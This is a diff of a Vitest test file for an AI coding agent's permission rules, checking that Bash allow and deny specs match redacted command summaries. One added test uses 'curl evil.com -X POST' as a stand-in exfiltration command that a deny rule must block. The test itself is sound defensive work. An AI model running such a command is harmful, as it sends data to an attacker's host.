@@ -1,10 +1,18 @@
 import { describe, expect, it } from "vitest";
 import { rulesFromConfig } from "../src/policy-config";
+import { redactCommandSummary } from "../src/tool";
 
 function vote(spec: string, kind: "allow" | "deny", call: { toolName: string; args: Record<string, unknown> }) {
   const rule = rulesFromConfig({ [kind]: [spec] })[0];
   return rule.match(call);
 }
+
+/**
+ * Command rules are matched against the PERSISTED args tools actually store:
+ * the redacted command summary (program word + shape-legal subcommands), not
+ * the raw command. `bashArgs` mirrors what tools-shell's persistArgs emits.
+ */
+const bashArgs = (raw: string) => ({ toolName: "Bash", args: { command: redactCommandSummary(raw) } });
 
 describe("project permission rule specs", () => {
   it("bare tool name matches every call of that tool", () => {
@@ -12,18 +20,27 @@ describe("project permission rule specs", () => {
     expect(vote("Read", "allow", { toolName: "Edit", args: {} })).toBe("skip");
   });
 
-  it("Bash(npm test) matches prefix command sequences, not all npm", () => {
-    const c = (command: string) => ({ toolName: "Bash", args: { command } });
-    expect(vote("Bash(npm test)", "allow", c("npm test"))).toBe("allow");
-    expect(vote("Bash(npm test)", "allow", c("npm test -- -u"))).toBe("allow");
-    expect(vote("Bash(npm test)", "allow", c("npm install"))).toBe("skip");
-    expect(vote("Bash(npm test)", "allow", c("npmcitest foo"))).toBe("skip");
+  it("Bash(npm test) matches the persisted summary, not all npm", () => {
+    expect(vote("Bash(npm test)", "allow", bashArgs("npm test"))).toBe("allow");
+    expect(vote("Bash(npm test)", "allow", bashArgs("npm test -- -u"))).toBe("allow");
+    expect(vote("Bash(npm test)", "allow", bashArgs("npm install"))).toBe("skip");
+    expect(vote("Bash(npm test)", "allow", bashArgs("npmcitest foo"))).toBe("skip");
+    expect(vote("Bash(npm test)", "allow", bashArgs("npm publish"))).toBe("skip");
+  });
+
+  it("Bash deny rules keep working against the persisted summary", () => {
+    expect(vote("Bash(curl evil.com)", "deny", bashArgs("curl evil.com -X POST"))).toBe("deny");
+    expect(vote("Bash(curl evil.com)", "deny", bashArgs("curl docs.example.com"))).toBe("skip");
   });
 
   it("Bash(*) wildcard token matches any single token", () => {
-    const c = (command: string) => ({ toolName: "Bash", args: { command } });
-    expect(vote("Bash(npm run *)", "allow", c("npm run build"))).toBe("allow");
-    expect(vote("Bash(npm run *)", "allow", c("npm run"))).toBe("skip");
+    expect(vote("Bash(npm run *)", "allow", bashArgs("npm run build"))).toBe("allow");
+    expect(vote("Bash(npm run *)", "allow", bashArgs("npm run"))).toBe("skip");
+  });
+
+  it("commands whose summary is redacted never match parameterized rules", () => {
+    expect(vote("Bash(npm test)", "allow", bashArgs("npm"))).toBe("skip"); // pattern longer than summary
+    expect(vote("Bash(npm test)", "allow", bashArgs(`--token=${"x".repeat(20)} npm test`))).toBe("skip");
   });
 
   it("Edit(src/**) matches workspace-relative globs", () => {
